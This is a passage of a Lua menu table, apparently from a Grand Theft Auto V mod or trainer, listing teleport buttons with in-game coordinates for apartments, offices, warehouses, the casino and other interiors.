            {text = 'Mody 3 apartment', dkey = 'teleport:apartments_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-774.1382, 342.0316, 196.6864)},
            {text = 'Vibrant 1 apartment', dkey = 'teleport:apartments_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.6245, 315.6175, 217.6385)},
            {text = 'Vibrant 2 apartment', dkey = 'teleport:apartments_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.9584, 315.7974, 187.9135)},
            {text = 'Vibrant 3 apartment', dkey = 'teleport:apartments_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-774.0223, 342.1718, 196.6863)},
            {text = 'Sharp 1 apartment', dkey = 'teleport:apartments_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.0902, 315.7039, 217.6384)},
            {text = 'Sharp 2 apartment', dkey = 'teleport:apartments_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.0155, 315.7071, 187.9135)},
            {text = 'Sharp 3 apartment', dkey = 'teleport:apartments_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-773.8976, 342.1525, 196.6863)},
            {text = 'Monochrome 1 apartment', dkey = 'teleport:apartments_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.9887, 315.7393, 217.6386)},
            {text = 'Monochrome 2 apartment', dkey = 'teleport:apartments_14', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.8809, 315.6634, 187.9136)},
            {text = 'Monochrome 3 apartment', dkey = 'teleport:apartments_15', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-774.0675, 342.0773, 196.6864)},
            {text = 'Seductive 1 apartment', dkey = 'teleport:apartments_16', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.1423, 315.6943, 217.6384)},
            {text = 'Seductive 2 apartment', dkey = 'teleport:apartments_17', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.0961, 315.815, 187.9135)},
            {text = 'Seductive 3 apartment', dkey = 'teleport:apartments_18', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-773.9552, 341.9892, 196.6862)},
            {text = 'Regal 1 apartment', dkey = 'teleport:apartments_19', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.029, 315.7113, 217.6385)},
            {text = 'Regal 2 apartment', dkey = 'teleport:apartments_20', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-787.0574, 315.6567, 187.9135)},
            {text = 'Regal 3 apartment', dkey = 'teleport:apartments_21', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-774.0109, 342.0965, 196.6863)},
            {text = 'Aqua 1 apartment', dkey = 'teleport:apartments_22', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.9469, 315.5655, 217.6383)},
            {text = 'Aqua 2 apartment', dkey = 'teleport:apartments_23', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-786.9756, 315.723, 187.9134)},
            {text = 'Aqua 3 apartment', dkey = 'teleport:apartments_24', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-774.0349, 342.0296, 196.6862)},
            {text = 'No IPL', option = __REAPER1__.M.Separator},
            {text = 'Low end apartment', dkey = 'teleport:apartments_25', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(261.4586, -998.8196, -99.00863)},
            {text = 'Medium end apartment', dkey = 'teleport:apartments_26', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(347.2686, -999.2955, -99.19622)},
            {text = '4 integrity way, apt 28', dkey = 'teleport:apartments_27', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-18.07856, -583.6725, 79.46569)},
            {text = '4 integrity way, apt 30', dkey = 'teleport:apartments_28', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-35.31277, -580.4199, 88.71221)},
            {text = 'Dell perro heights, apt 4', dkey = 'teleport:apartments_29', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1468.14, -541.815, 73.4442)},
            {text = 'Dell perro heights, apt 7', dkey = 'teleport:apartments_30', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1477.14, -538.7499, 55.5264)},
            {text = 'Richard majestic, apt 2', dkey = 'teleport:apartments_31', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-915.811, -379.432, 113.6748)},
            {text = 'Tinsel towers, apt 42', dkey = 'teleport:apartments_32', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-614.86, 40.6783, 97.60007)},
            {text = 'Eclipse towers, apt 3', dkey = 'teleport:apartments_33', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-773.407, 341.766, 211.397)},
            {text = '3655 wild oats drive', dkey = 'teleport:apartments_34', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-169.286, 486.4938, 137.4436)},
            {text = '2044 north conker avenue', dkey = 'teleport:apartments_35', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(340.9412, 437.1798, 149.3925)},
            {text = '2045 north conker avenue', dkey = 'teleport:apartments_36', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(373.023, 416.105, 145.7006)},
            {text = '2862 hillcrest avenue', dkey = 'teleport:apartments_37', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-676.127, 588.612, 145.1698)},
            {text = '2868 hillcrest avenue', dkey = 'teleport:apartments_38', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-763.107, 615.906, 144.1401)},
            {text = '2874 hillcrest avenue', dkey = 'teleport:apartments_39', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-857.798, 682.563, 152.6529)},
            {text = '2677 whispymound drive', dkey = 'teleport:apartments_40', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(120.5, 549.952, 184.097)},
            {text = '2133 mad wayne thunder', dkey = 'teleport:apartments_41', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1288, 440.748, 97.69459)},
        },

        ['teleport:arcades'] = {
            {text = 'Executive rich', dkey = 'teleport:arcades_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.1987, -620.913, 168.8205)},
            {text = 'Executive cool', dkey = 'teleport:arcades_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.5429, -620.9524, 168.8204)},
            {text = 'Executive contrast', dkey = 'teleport:arcades_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.2896, -620.9618, 168.8204)},
            {text = 'Old spice warm', dkey = 'teleport:arcades_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.4966, -620.8292, 168.8204)},
            {text = 'Old spice classical', dkey = 'teleport:arcades_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.3997, -620.9006, 168.8204)},
            {text = 'Old spice Vintage', dkey = 'teleport:arcades_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.5361, -620.9186, 168.8204)},
            {text = 'Power broker ice', dkey = 'teleport:arcades_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.392, -621.0451, 168.8204)},
            {text = 'Power broker Conservative', dkey = 'teleport:arcades_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.1945, -620.8729, 168.8204)},
            {text = 'Power broker Polished', dkey = 'teleport:arcades_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-141.4924, -621.0035, 168.8205)},
            {text = 'Garage 1', dkey = 'teleport:arcades_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-191.0133, -579.1428, 135.0000)},
            {text = 'Garage 2', dkey = 'teleport:arcades_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-117.4989, -568.1132, 135.0000)},
            {text = 'Garage 3', dkey = 'teleport:arcades_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-136.0780, -630.1852, 135.0000)},
            {text = 'Mod shop', dkey = 'teleport:arcades_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-146.6166, -596.6301, 166.0000)},
        },

        ['teleport:mazebank'] = {
            {text = 'Executive rich', dkey = 'teleport:mazebank_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.8466, -826.9893, 243.3859)},
            {text = 'Executive cool', dkey = 'teleport:mazebank_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.49945, -827.05, 243.386)},
            {text = 'Executive contrast', dkey = 'teleport:mazebank_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.49827, -827.1889, 243.386)},
            {text = 'Old spice warm', dkey = 'teleport:mazebank_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.44054, -827.1487, 243.3859)},
            {text = 'Old spice classical', dkey = 'teleport:mazebank_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.63942, -827.1022, 243.3859)},
            {text = 'Old spice bintage', dkey = 'teleport:mazebank_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.47446, -827.2621, 243.386)},
            {text = 'Power broker ice', dkey = 'teleport:mazebank_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.56978, -827.1152, 243.3859)},
            {text = 'Power broker conservative', dkey = 'teleport:mazebank_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.51953, -827.0786, 243.3859)},
            {text = 'Power broker polished', dkey = 'teleport:mazebank_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-75.41915, -827.1118, 243.3858)},
            {text = 'Garage 1', dkey = 'teleport:mazebank_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-84.2193, -823.0851, 221.0000)},
            {text = 'Garage 2', dkey = 'teleport:mazebank_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-69.8627, -824.7498, 221.0000)},
            {text = 'Garage 3', dkey = 'teleport:mazebank_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-80.4318, -813.2536, 221.0000)},
            {text = 'Mod shop', dkey = 'teleport:mazebank_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-73.9039, -821.6204, 284.0000)},
        },

        ['teleport:lombank'] = {
            {text = 'Executive rich', dkey = 'teleport:lombank_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.756, -565.0661, 108.523)},
            {text = 'Executive cool', dkey = 'teleport:lombank_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.678, -565.0034, 108.5229)},
            {text = 'Executive contrast', dkey = 'teleport:lombank_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.583, -565.0399, 108.5229)},
            {text = 'Old spice warm', dkey = 'teleport:lombank_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.702, -565.0366, 108.5229)},
            {text = 'Old spice classical', dkey = 'teleport:lombank_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.643, -564.9685, 108.5229)},
            {text = 'Old spice vintage', dkey = 'teleport:lombank_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.681, -565.0003, 108.523)},
            {text = 'Power broker ice', dkey = 'teleport:lombank_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.677, -565.0689, 108.5229)},
            {text = 'Power broker conservative', dkey = 'teleport:lombank_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.708, -564.9634, 108.5229)},
            {text = 'Power broker polished', dkey = 'teleport:lombank_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1579.693, -564.8981, 108.5229)},
            {text = 'Garage 1', dkey = 'teleport:lombank_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1581.1120, -567.2450, 85.5000)},
            {text = 'Garage 2', dkey = 'teleport:lombank_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1568.7390, -562.0455, 85.5000)},
            {text = 'Garage 3', dkey = 'teleport:lombank_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1563.5570, -574.4314, 85.5000)},
            {text = 'Mod shop', dkey = 'teleport:lombank_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1578.0230, -576.4251, 104.2000)},
        },

        ['teleport:mazebankwest'] = {
            {text = 'Executive rich', dkey = 'teleport:mazebankwest_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.667, -480.4736, 72.04217)},
            {text = 'Executive cool', dkey = 'teleport:mazebankwest_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.542, -480.4011, 72.04211)},
            {text = 'Executive contrast', dkey = 'teleport:mazebankwest_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.626, -480.4856, 72.04212)},
            {text = 'Old spice warm', dkey = 'teleport:mazebankwest_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.617, -480.6363, 72.04208)},
            {text = 'Old spice classical', dkey = 'teleport:mazebankwest_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.532, -480.7649, 72.04207)},
            {text = 'Old spice vintage', dkey = 'teleport:mazebankwest_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.611, -480.5562, 72.04214)},
            {text = 'Power broker ice', dkey = 'teleport:mazebankwest_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.563, -480.549, 72.0421)},
            {text = 'Power broker conservative', dkey = 'teleport:mazebankwest_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.528, -480.475, 72.04206)},
            {text = 'Power broker polished', dkey = 'teleport:mazebankwest_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1392.416, -480.7485, 72.04207)},
            {text = 'Garage 1', dkey = 'teleport:mazebankwest_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1388.8400, -478.7402, 56.1000)},
            {text = 'Garage 2', dkey = 'teleport:mazebankwest_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1388.8600, -478.7574, 48.1000)},
            {text = 'Garage 3', dkey = 'teleport:mazebankwest_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1374.6820, -474.3586, 56.1000)},
            {text = 'Mod shop', dkey = 'teleport:mazebankwest_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1391.2450, -473.9638, 77.2000)},
        },

        ['teleport:clubwarehouses'] = {
            {text = 'Clubhouse 1', dkey = 'teleport:clubwarehouses_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1107.04, -3157.399, -37.51859)},
            {text = 'Clubhouse 2', dkey = 'teleport:clubwarehouses_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(998.4809, -3164.711, -38.90733)},
            {text = 'Meth lab', dkey = 'teleport:clubwarehouses_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1009.5, -3196.6, -38.99682)},
            {text = 'Weed farm', dkey = 'teleport:clubwarehouses_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1051.491, -3196.536, -39.14842)},
            {text = 'Cocaine lockup', dkey = 'teleport:clubwarehouses_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1093.6, -3196.6, -38.99841)},
            {text = 'Counterfeit cash factory', dkey = 'teleport:clubwarehouses_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1121.897, -3195.338, -40.4025)},
            {text = 'Document forgery office', dkey = 'teleport:clubwarehouses_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1165, -3196.6, -39.01306)},
            {text = 'Warehouse small', dkey = 'teleport:clubwarehouses_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1094.988, -3101.776, -39.00363)},
            {text = 'Warehouse medium', dkey = 'teleport:clubwarehouses_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1056.486, -3105.724, -39.00439)},
            {text = 'Warehouse large', dkey = 'teleport:clubwarehouses_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1006.967, -3102.079, -39.0035)},
            {text = 'Vehicle warehouse', dkey = 'teleport:clubwarehouses_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(994.5925, -3002.594, -39.64699)},
            {text = 'Lost MC clubhouse', dkey = 'teleport:clubwarehouses_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(982.0083, -100.8747, 74.84512)},
        },

        ['teleport:special'] = {
            {text = 'Cargo ship', dkey = 'teleport:special_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-163.3628, -2385.161, 5.999994)},
            {text = 'Red carpet', dkey = 'teleportspecial_4:', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(300.5927, 300.5927, 104.3776)},
            {text = 'Rekt stilthouse destroyed', dkey = 'teleport:special_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1020.518, 663.27, 153.5167)},
            {text = 'Rekt stilthouse rebuild', dkey = 'teleport:special_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1020.518, 663.27, 153.5167)},
            {text = 'Union depository', dkey = 'teleport:special_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2.6968, -667.0166, 16.13061)},
            {text = 'Trevors trailer dirty', dkey = 'teleport:special_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1975.552, 3820.538, 33.44833)},
            {text = 'Trevors trailer clean', dkey = 'teleport:special_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1975.552, 3820.538, 33.44833)},
            {text = 'Stadium', dkey = 'teleport:special_10', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-248.6731, -2010.603, 30.14562)},
            {text = 'Max renda shop', dkey = 'teleport:special_11', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-585.8247, -282.72, 35.45475)},
            {text = 'Jewel store', dkey = 'teleport:special_12', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-630.07, -236.332, 38.05704)},
            {text = 'FIB lobby', dkey = 'teleport:special_13', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(110.4, -744.2, 45.7496)},
            {text = 'Multiple IPL', option = __REAPER1__.M.Separator},
            {text = 'Gunrunning heist yacht', dkey = 'teleport:special_14', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1373.828, 6737.393, 6.707596)},
            {text = 'Dignity heist yacht', dkey = 'teleport:special_15', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-2027.946, -1036.695, 6.707587)},
            {text = 'Dignity party yacht', dkey = 'teleport:special_16', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-2023.643, -1038.119, 5.576781)},
            {text = 'Aircraft carrier', dkey = 'teleport:special_17', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(3084.73, -4770.709, 15.26167)},
            {text = 'Bridge train crash', dkey = 'teleport:special_18', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(532.1309, 4526.187, 89.79387)},
            {text = 'North yankton', dkey = 'teleport:special_19', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3( 3217.697, -4834.826, 111.8152)},
            {text = 'Oneils farm burnt', dkey = 'teleport:special_20', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2469.03, 4955.278, 45.11892)},
            {text = 'Morgue', dkey = 'teleport:special_21', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(275.446, -1361.11, 24.5378)},
        },

        ['teleport:diamondcasino'] = {
            {text = 'Casino', dkey = 'teleport:diamondcasino_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1100.000, 220.000, -50.000)},
            {text = 'Garage', dkey = 'teleport:diamondcasino_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1295.000, 230.000, -50.000)},
            {text = 'Car park', dkey = 'teleport:diamondcasino_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(1380.000, 200.000, -50.000)},
            {text = 'Penthouse', dkey = 'teleport:diamondcasino_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(976.636, 70.295, 115.164)},
        },

        ['teleport:cargarages'] = {
            {text = '2 Car', dkey = 'teleport:cargarages_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(173.2903, -1003.6, -99.65707)},
            {text = '6 Car', dkey = 'teleport:cargarages_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(197.8153, -1002.293, -99.65749)},
            {text = '10 Car', dkey = 'teleport:cargarages_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(229.9559, -981.7928, -99.66071)},
        },

        ['teleport:misc'] = {
            {text = 'Bunker interior', dkey = 'teleport:misc_1', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(899.5518,-3246.038, -98.04907)},
            {text = 'Charcreator', dkey = 'teleport:misc_2', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(402.5164, -1002.847, -99.2587)},
            {text = 'Mission carpark', dkey = 'teleport:misc_3', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(405.9228, -954.1149, -99.6627)},
            {text = 'Torture room', dkey = 'teleport:misc_4', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(136.5146, -2203.149, 7.30914)},
            {text = 'Solomon\'s office', dkey = 'teleport:misc_5', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1005.84, -478.92, 50.02733)},
            {text = 'Psychiatrist\'s office', dkey = 'teleport:misc_6', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1908.024, -573.4244, 19.09722)},
            {text = 'Omega\'s garage', dkey = 'teleport:misc_7', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(2331.344, 2574.073, 46.68137)},
            {text = 'Movie theatre', dkey = 'teleport:misc_8', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(-1427.299, -245.1012, 16.8039)},
            {text = 'Motel', dkey = 'teleport:misc_9', desc = 'Teleport to this location.', afu = __REAPER1__.M.teleport.tptolocation, option = __REAPER1__.M.Button, extra = vector3(152.2605, -1004.471, -98.99999)},
